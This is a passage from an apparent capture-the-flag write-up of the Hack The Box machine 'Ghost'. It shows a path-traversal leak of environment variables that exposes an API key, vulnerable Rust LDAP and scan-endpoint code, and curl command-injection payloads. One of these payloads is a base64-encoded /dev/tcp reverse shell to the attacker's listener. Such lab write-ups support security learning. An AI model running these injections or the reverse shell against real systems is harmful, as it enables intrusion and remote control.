unknown.&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Spotlight Series&lt;/strong&gt;: Get to know the passionate individuals behind the investigations. Our Spotlight Series puts a face to the name, sharing the stories and expertise of our dedicated team.&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Community Corner&lt;/strong&gt;: Ghost is more than a website; it&#x27;s a community. Share your own supernatural experiences, theories, and questions in our Community Corner. Together, we amplify the voices seeking to understand the inexplicable.&lt;/li&gt;&lt;/ol&gt;&lt;h2 id=\&quot;join-us-on-this-extraordinary-expedition\&quot;&gt;Join Us on this Extraordinary Expedition&lt;/h2&gt;&lt;p&gt;The journey into the paranormal is not for the faint of heart, but it is a journey worth taking. As we lift the veil on the mysteries that surround us, we invite you to be an active participant in this extraordinary expedition. Engage with our content, share your thoughts, and let the spirit of exploration guide us into uncharted territories.&lt;/p&gt;&lt;p&gt;Ghost is not just a website; it&#x27;s a portal to the enigmatic, a gateway to the supernatural, and a testament to the boundless curiosity that defines the human spirit.&lt;/p&gt;&lt;p&gt;Welcome to our realm. Let the haunting begin!&lt;/p&gt;&lt;p&gt;Happy ghost hunting,&lt;/p&gt;&lt;p&gt;The Ghost Team&lt;/p&gt;&quot;,
      &quot;comment_id&quot;: &quot;659cdeec9cd6330001baefbf&quot;,
      &lt;..SNIP..&gt;
      &quot;frontmatter&quot;: null,
      &quot;feature_image_alt&quot;: null,
      &quot;feature_image_caption&quot;: null
    }
  ],
  &quot;meta&quot;: {
    &quot;pagination&quot;: {
      &quot;page&quot;: 1,
      &quot;limit&quot;: 15,
      &quot;pages&quot;: 1,
      &quot;total&quot;: 1,
      &quot;next&quot;: null,
      &quot;prev&quot;: null
    },
    &quot;extra&quot;: {
      &quot;../../../../../../../../../proc/self/environ&quot;: &quot;HOSTNAME=26ae7990f3dd\u0000&lt;..SNIP..&gt;\u0000</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>DEV_INTRANET_KEY=!@yqr!X2kxmQ.@Xe</span></mark></span><span class="SemanticString"><span>\u0000&lt;..SNIP..&gt;&quot;
    }
  }
}</span></span></span></code></pre><div id="https://www.notion.so/1fe0b98a88f7806d8d79d4842e5a4c2d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The Intranet API key is found: </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">!@yqr!X2kxmQ.@Xe</code></span><span class="SemanticString">.</span></span></p></div><div id="https://www.notion.so/1fe0b98a88f7809ab341c82409412c29" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1fe0b98a88f780819cacc40b84a92d4c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Gitea — Intranet:</strong></span></span></p></div><div id="https://www.notion.so/1fe0b98a88f78085836bc859c9848a5d" class="Image Image--PageWidth"><figure><a href="https://github.com/ch3ng625/blog_images/blob/main/ghost/gitea_intranet.png?raw=true"><img src="https://github.com/ch3ng625/blog_images/blob/main/ghost/gitea_intranet.png?raw=true" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/1fe0b98a88f780999559fc7356969fb9" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">intranet</code></span><span class="SemanticString"> contains the full source code of the Intranet portal. As suspected earlier, the user passwords are stored in plaintext as an LDAP attribute </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">intranetSecret</code></span><span class="SemanticString"> and queried using a non-parameterized filter.</span></span></p></div><div id="https://www.notion.so/1fe0b98a88f7805c8301dbd224299bd8" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">backend/src/api/ldap.rs</code></span><span class="SemanticString">:</span></span></p></div><pre id="https://www.notion.so/1fe0b98a88f780c188e0c6f8eeb627b7" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>use ldap3<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token punctuation">{</span>Scope<span class="token punctuation">,</span> SearchEntry<span class="token punctuation">}</span><span class="token punctuation">;</span>
use rocket<span class="token punctuation">:</span><span class="token punctuation">:</span>http<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token punctuation">{</span>Cookie<span class="token punctuation">,</span> CookieJar<span class="token punctuation">}</span><span class="token punctuation">;</span>
use rocket<span class="token punctuation">:</span><span class="token punctuation">:</span>serde<span class="token punctuation">:</span><span class="token punctuation">:</span>json<span class="token punctuation">:</span><span class="token punctuation">:</span>Json<span class="token punctuation">;</span>
use time<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token punctuation">{</span>Duration<span class="token punctuation">,</span> OffsetDateTime<span class="token punctuation">}</span><span class="token punctuation">;</span>

use crate<span class="token punctuation">:</span><span class="token punctuation">:</span>api<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token punctuation">{</span>ldap_error<span class="token punctuation">,</span> route_error<span class="token punctuation">,</span> RouteErrorRocket<span class="token punctuation">,</span> RouteErrorType<span class="token punctuation">,</span> LoginRequest<span class="token punctuation">,</span> UserClaim<span class="token punctuation">}</span><span class="token punctuation">;</span>
use crate<span class="token punctuation">:</span><span class="token punctuation">:</span>api<span class="token punctuation">:</span><span class="token punctuation">:</span>ldap<span class="token punctuation">:</span><span class="token punctuation">:</span>ldap_bind<span class="token punctuation">;</span>

<span class="token keyword">async</span> fn ldap_connect<span class="token punctuation">(</span>username<span class="token punctuation">:</span> <span class="token operator">&amp;</span>String<span class="token punctuation">,</span> secret<span class="token punctuation">:</span> <span class="token operator">&amp;</span>String<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> anyhow<span class="token punctuation">:</span><span class="token punctuation">:</span>Result<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> RouteErrorRocket<span class="token operator">></span> <span class="token punctuation">{</span>
    let mut ldap <span class="token operator">=</span> ldap_bind<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token keyword">await</span>?<span class="token punctuation">;</span>

    let dn <span class="token operator">=</span> <span class="token string">"CN=Users,DC=ghost,DC=htb"</span><span class="token punctuation">;</span>
    let <span class="token punctuation">(</span>mut rs<span class="token punctuation">,</span> _res<span class="token punctuation">)</span> <span class="token operator">=</span> ldap
        <span class="token punctuation">.</span>search<span class="token punctuation">(</span>
            <span class="token operator">&amp;</span>dn<span class="token punctuation">,</span>
            Scope<span class="token punctuation">:</span><span class="token punctuation">:</span>Subtree<span class="token punctuation">,</span>
            <span class="token operator">&amp;</span><span class="token builtin">format</span>!<span class="token punctuation">(</span><span class="token string">"(&amp;(displayName={})(intranetSecret={}))"</span><span class="token punctuation">,</span> username<span class="token punctuation">,</span> secret<span class="token punctuation">)</span><span class="token punctuation">,</span>
            vec!<span class="token punctuation">[</span><span class="token string">"intranetSecret"</span><span class="token punctuation">,</span> <span class="token string">"sAMAccountName"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
        <span class="token punctuation">)</span>
        <span class="token punctuation">.</span><span class="token keyword">await</span><span class="token punctuation">.</span><span class="token keyword">or</span><span class="token punctuation">(</span>Err<span class="token punctuation">(</span>route_error<span class="token punctuation">(</span>RouteErrorType<span class="token punctuation">:</span><span class="token punctuation">:</span>Unknown<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>?
        <span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>or_else<span class="token punctuation">(</span>ldap_error<span class="token punctuation">)</span>?<span class="token punctuation">;</span>

    ldap<span class="token punctuation">.</span>unbind<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token keyword">await</span><span class="token punctuation">.</span>ok<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> rs<span class="token punctuation">.</span>is_empty<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> Err<span class="token punctuation">(</span>route_error<span class="token punctuation">(</span>RouteErrorType<span class="token punctuation">:</span><span class="token punctuation">:</span>NotFound<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    let entry <span class="token operator">=</span> SearchEntry<span class="token punctuation">:</span><span class="token punctuation">:</span>construct<span class="token punctuation">(</span>rs<span class="token punctuation">.</span>remove<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">match</span> entry<span class="token punctuation">.</span>attrs<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"sAMAccountName"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        Some<span class="token punctuation">(</span>values<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">match</span> values<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            Some<span class="token punctuation">(</span>username<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> Ok<span class="token punctuation">(</span>username<span class="token punctuation">.</span>clone<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token boolean">None</span> <span class="token operator">=</span><span class="token operator">></span> Err<span class="token punctuation">(</span>route_error<span class="token punctuation">(</span>RouteErrorType<span class="token punctuation">:</span><span class="token punctuation">:</span>Unknown<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span>
        <span class="token boolean">None</span> <span class="token operator">=</span><span class="token operator">></span> Err<span class="token punctuation">(</span>route_error<span class="token punctuation">(</span>RouteErrorType<span class="token punctuation">:</span><span class="token punctuation">:</span>Unknown<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token comment">#[post("/login", data = "&lt;body>")]</span>
pub <span class="token keyword">async</span> fn login<span class="token punctuation">(</span>body<span class="token punctuation">:</span> Json<span class="token operator">&lt;</span>LoginRequest<span class="token operator">></span><span class="token punctuation">,</span> cookies<span class="token punctuation">:</span> <span class="token operator">&amp;</span>CookieJar<span class="token operator">&lt;</span>'_<span class="token operator">></span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> anyhow<span class="token punctuation">:</span><span class="token punctuation">:</span>Result<span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> RouteErrorRocket<span class="token operator">></span> <span class="token punctuation">{</span>
    let username <span class="token operator">=</span> ldap_connect<span class="token punctuation">(</span><span class="token operator">&amp;</span>body<span class="token punctuation">.</span>ldap_username<span class="token punctuation">,</span> <span class="token operator">&amp;</span>body<span class="token punctuation">.</span>ldap_secret<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token keyword">await</span>?<span class="token punctuation">;</span>
    let claim <span class="token operator">=</span> UserClaim<span class="token punctuation">:</span><span class="token punctuation">:</span>sign<span class="token punctuation">(</span>UserClaim <span class="token punctuation">{</span>
        username<span class="token punctuation">:</span> username<span class="token punctuation">.</span>to_string<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    let mut cookie <span class="token operator">=</span> Cookie<span class="token punctuation">:</span><span class="token punctuation">:</span>new<span class="token punctuation">(</span><span class="token string">"token"</span><span class="token punctuation">,</span> <span class="token builtin">format</span>!<span class="token punctuation">(</span><span class="token string">"Bearer {}"</span><span class="token punctuation">,</span> claim<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    let mut now <span class="token operator">=</span> OffsetDateTime<span class="token punctuation">:</span><span class="token punctuation">:</span>now_utc<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    now <span class="token operator">+=</span> Duration<span class="token punctuation">:</span><span class="token punctuation">:</span>days<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    cookie<span class="token punctuation">.</span>set_expires<span class="token punctuation">(</span>now<span class="token punctuation">)</span><span class="token punctuation">;</span>

    cookies<span class="token punctuation">.</span>add<span class="token punctuation">(</span>cookie<span class="token punctuation">)</span><span class="token punctuation">;</span>

    Ok<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</span></span></span></code></pre><div id="https://www.notion.so/1fe0b98a88f7803991e4e98d02823cac" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1fe0b98a88f7805cb3b4f62f1b61048f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The Readme also mentions that </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/api-dev</code></span><span class="SemanticString"> will be open until development is complete. Endpoints like these are typically implemented for ad-hoc debugging and quick fixes, often with little consideration for security. As a result they tend to hold excessive permissions and access.</span></span></p></div><div id="https://www.notion.so/1fe0b98a88f7801c83c3e26079157ece" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">backend/src/api/dev.rs</code></span><span class="SemanticString">:</span></span></p></div><pre id="https://www.notion.so/1fe0b98a88f7808bb742ebaefb8ba4b7" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>use rocket<span class="token punctuation">:</span><span class="token punctuation">:</span>http<span class="token punctuation">:</span><span class="token punctuation">:</span>Status<span class="token punctuation">;</span>
use rocket<span class="token punctuation">:</span><span class="token punctuation">:</span>Request<span class="token punctuation">;</span>
use rocket<span class="token punctuation">:</span><span class="token punctuation">:</span>request<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token punctuation">{</span>FromRequest<span class="token punctuation">,</span> Outcome<span class="token punctuation">}</span><span class="token punctuation">;</span>

pub<span class="token punctuation">(</span>crate<span class="token punctuation">)</span> mod scan<span class="token punctuation">;</span>

pub struct DevGuard<span class="token punctuation">;</span>

<span class="token comment">#[rocket::async_trait]</span>
impl<span class="token operator">&lt;</span><span class="token string">'r> FromRequest&lt;'</span>r<span class="token operator">></span> <span class="token keyword">for</span> DevGuard <span class="token punctuation">{</span>
    <span class="token builtin">type</span> Error <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">async</span> fn from_request<span class="token punctuation">(</span>request<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token string">'r Request&lt;'</span>_<span class="token operator">></span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> Outcome<span class="token operator">&lt;</span>Self<span class="token punctuation">,</span> Self<span class="token punctuation">:</span><span class="token punctuation">:</span>Error<span class="token operator">></span> <span class="token punctuation">{</span>
        let key <span class="token operator">=</span> request<span class="token punctuation">.</span>headers<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get_one<span class="token punctuation">(</span><span class="token string">"X-DEV-INTRANET-KEY"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">match</span> key <span class="token punctuation">{</span>
            Some<span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
                <span class="token keyword">if</span> key <span class="token operator">==</span> std<span class="token punctuation">:</span><span class="token punctuation">:</span>env<span class="token punctuation">:</span><span class="token punctuation">:</span>var<span class="token punctuation">(</span><span class="token string">"DEV_INTRANET_KEY"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>unwrap<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    Outcome<span class="token punctuation">:</span><span class="token punctuation">:</span>Success<span class="token punctuation">(</span>DevGuard <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                    Outcome<span class="token punctuation">:</span><span class="token punctuation">:</span>Error<span class="token punctuation">(</span><span class="token punctuation">(</span>Status<span class="token punctuation">:</span><span class="token punctuation">:</span>Unauthorized<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span><span class="token punctuation">,</span>
            <span class="token boolean">None</span> <span class="token operator">=</span><span class="token operator">></span> Outcome<span class="token punctuation">:</span><span class="token punctuation">:</span>Error<span class="token punctuation">(</span><span class="token punctuation">(</span>Status<span class="token punctuation">:</span><span class="token punctuation">:</span>Unauthorized<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span></span></span></span></code></pre><div id="https://www.notion.so/1fe0b98a88f780ee96d9c719c8217663" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">To access the API endpoints, the Intranet key must be included as an HTTP header </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">X-DEV-INTRANET-KEY</code></span><span class="SemanticString">.</span></span></p></div><div id="https://www.notion.so/1fe0b98a88f78097ba4cd31bb65d1ddc" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">backend/src/api/dev/scan.rs</code></span><span class="SemanticString">:</span></span></p></div><pre id="https://www.notion.so/1fe0b98a88f780deb7d6f63784dc0560" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>use std<span class="token punctuation">:</span><span class="token punctuation">:</span>process<span class="token punctuation">:</span><span class="token punctuation">:</span>Command<span class="token punctuation">;</span>

use rocket<span class="token punctuation">:</span><span class="token punctuation">:</span>serde<span class="token punctuation">:</span><span class="token punctuation">:</span>json<span class="token punctuation">:</span><span class="token punctuation">:</span>Json<span class="token punctuation">;</span>
use rocket<span class="token punctuation">:</span><span class="token punctuation">:</span>serde<span class="token punctuation">:</span><span class="token punctuation">:</span>Serialize<span class="token punctuation">;</span>
use serde<span class="token punctuation">:</span><span class="token punctuation">:</span>Deserialize<span class="token punctuation">;</span>

use crate<span class="token punctuation">:</span><span class="token punctuation">:</span>api<span class="token punctuation">:</span><span class="token punctuation">:</span>dev<span class="token punctuation">:</span><span class="token punctuation">:</span>DevGuard<span class="token punctuation">;</span>

<span class="token comment">#[derive(Deserialize)]</span>
pub struct ScanRequest <span class="token punctuation">{</span>
    url<span class="token punctuation">:</span> String<span class="token punctuation">,</span>
<span class="token punctuation">}</span>

<span class="token comment">#[derive(Serialize)]</span>
pub struct ScanResponse <span class="token punctuation">{</span>
    is_safe<span class="token punctuation">:</span> <span class="token builtin">bool</span><span class="token punctuation">,</span>
    <span class="token operator">//</span> remove the following once the route <span class="token keyword">is</span> stable
    temp_command_success<span class="token punctuation">:</span> <span class="token builtin">bool</span><span class="token punctuation">,</span>
    temp_command_stdout<span class="token punctuation">:</span> String<span class="token punctuation">,</span>
    temp_command_stderr<span class="token punctuation">:</span> String<span class="token punctuation">,</span>
<span class="token punctuation">}</span>

<span class="token operator">//</span> Scans an url inside a blog post
<span class="token operator">//</span> This will be called by the blog to ensure <span class="token builtin">all</span> URLs <span class="token keyword">in</span> posts are safe
<span class="token comment">#[post("/scan", format = "json", data = "&lt;data>")]</span>
pub fn scan<span class="token punctuation">(</span>_guard<span class="token punctuation">:</span> DevGuard<span class="token punctuation">,</span> data<span class="token punctuation">:</span> Json<span class="token operator">&lt;</span>ScanRequest<span class="token operator">></span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> Json<span class="token operator">&lt;</span>ScanResponse<span class="token operator">></span> <span class="token punctuation">{</span>
    <span class="token operator">//</span> currently intranet_url_check <span class="token keyword">is</span> <span class="token keyword">not</span> implemented<span class="token punctuation">,</span>
    <span class="token operator">//</span> but the route exists <span class="token keyword">for</span> future compatibility <span class="token keyword">with</span> the blog
    let result <span class="token operator">=</span> Command<span class="token punctuation">:</span><span class="token punctuation">:</span>new<span class="token punctuation">(</span><span class="token string">"bash"</span><span class="token punctuation">)</span>
        <span class="token punctuation">.</span>arg<span class="token punctuation">(</span><span class="token string">"-c"</span><span class="token punctuation">)</span>
        <span class="token punctuation">.</span>arg<span class="token punctuation">(</span><span class="token builtin">format</span>!<span class="token punctuation">(</span><span class="token string">"intranet_url_check {}"</span><span class="token punctuation">,</span> data<span class="token punctuation">.</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">.</span>output<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">match</span> result <span class="token punctuation">{</span>
        Ok<span class="token punctuation">(</span>output<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
            Json<span class="token punctuation">(</span>ScanResponse <span class="token punctuation">{</span>
                is_safe<span class="token punctuation">:</span> true<span class="token punctuation">,</span>
                temp_command_success<span class="token punctuation">:</span> true<span class="token punctuation">,</span>
                temp_command_stdout<span class="token punctuation">:</span> String<span class="token punctuation">:</span><span class="token punctuation">:</span>from_utf8<span class="token punctuation">(</span>output<span class="token punctuation">.</span>stdout<span class="token punctuation">)</span><span class="token punctuation">.</span>unwrap_or<span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>to_string<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                temp_command_stderr<span class="token punctuation">:</span> String<span class="token punctuation">:</span><span class="token punctuation">:</span>from_utf8<span class="token punctuation">(</span>output<span class="token punctuation">.</span>stderr<span class="token punctuation">)</span><span class="token punctuation">.</span>unwrap_or<span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>to_string<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token punctuation">}</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span>
        Err<span class="token punctuation">(</span>_<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> Json<span class="token punctuation">(</span>ScanResponse <span class="token punctuation">{</span>
            is_safe<span class="token punctuation">:</span> true<span class="token punctuation">,</span>
            temp_command_success<span class="token punctuation">:</span> false<span class="token punctuation">,</span>
            temp_command_stdout<span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">.</span>to_string<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            temp_command_stderr<span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">.</span>to_string<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</span></span></span></code></pre><div id="https://www.notion.so/1fe0b98a88f78027bd82e821bb323282" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">There’s an under-development </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/scan</code></span><span class="SemanticString"> endpoint for checking URLs in blog posts. The current implementation uses a Bash command. I’m not sure what </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">intranet_url_check</code></span><span class="SemanticString"> does, but it definitely looks injectable given POST data are included as part of the command.</span></span></p></div><div id="https://www.notion.so/1fe0b98a88f780a9a3e8c06cf22c1a3e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1fe0b98a88f780fa83e9dc1a5057869b" class="Divider"></div><h3 id="https://www.notion.so/1fe0b98a88f78057af2bc7eeb4064d76" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/1fe0b98a88f78057af2bc7eeb4064d76"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Foothold:</span></span></h3><div id="https://www.notion.so/1fe0b98a88f780509fcdc63ccb459cbe" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Intranet API Command Injection:</strong></span></span></p></div><div id="https://www.notion.so/1fe0b98a88f78053b015e18d224b8ff1" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The API takes a URL as JSON POST data. It returned an error since the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">intranet_url_check</code></span><span class="SemanticString"> command does not exist.</span></span></p></div><pre id="https://www.notion.so/1fe0b98a88f780d7aa04d396bae50101" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/ghost]
└─$</span></mark></span><span class="SemanticString"><span> curl -X POST &#x27;http://intranet.ghost.htb:8008/api-dev/scan&#x27; -H &#x27;X-DEV-INTRANET-KEY: !@yqr!X2kxmQ.@Xe&#x27; -H &#x27;Content-Type: application/json&#x27; -d &#x27;{&quot;url&quot;:&quot;http://ghost.htb&quot;}&#x27;

{&quot;is_safe&quot;:true,&quot;temp_command_success&quot;:true,&quot;temp_command_stdout&quot;:&quot;&quot;,&quot;temp_command_stderr&quot;:&quot;bash: line 1: intranet_url_check: command not found\n&quot;}</span></span></span></code></pre><div id="https://www.notion.so/1fe0b98a88f78024873dd1693f047fd6" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Given its insecure implementation, OS commands can be appended after the URL, and the server would execute it and return the output.</span></span></p></div><pre id="https://www.notion.so/1fe0b98a88f7809282fddacce4a16d24" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/ghost]
└─$</span></mark></span><span class="SemanticString"><span> curl -X POST &#x27;http://intranet.ghost.htb:8008/api-dev/scan&#x27; -H &#x27;X-DEV-INTRANET-KEY: !@yqr!X2kxmQ.@Xe&#x27; -H &#x27;Content-Type: application/json&#x27; -d &#x27;{&quot;url&quot;:&quot;http://ghost.htb; whoami&quot;}&#x27;

{&quot;is_safe&quot;:true,&quot;temp_command_success&quot;:true,&quot;temp_command_stdout&quot;:&quot;root\n&quot;,&quot;temp_command_stderr&quot;:&quot;bash: line 1: intranet_url_check: command not found\n&quot;}</span></span></span></code></pre><div id="https://www.notion.so/1fe0b98a88f7809a829fcbeb0604d296" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ll send a base64-encoded revshell command:</span></span></p></div><div id="https://www.notion.so/1fe0b98a88f780488498da0c28ade3e6" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ curl -X POST &#x27;http://intranet.ghost.htb:8008/api-dev/scan&#x27; -H &#x27;X-DEV-INTRANET-KEY: !@yqr!X2kxmQ.@Xe&#x27; -H &#x27;Content-Type: application/json&#x27; -d &#x27;{&quot;url&quot;:&quot;http://ghost.htb; echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjkzLzgwMDEgMD4mMQ== | base64 -d | bash&quot;}&#x27;</code></span></span></p></div><div id="https://www.notion.so/1fe0b98a88f780889f11d891c9cf5192" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">On my listener, it caught a root shell in a container:</span></span></p></div><pre id="https://www.notion.so/1fe0b98a88f7808c9f44edbf70e497c5" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor 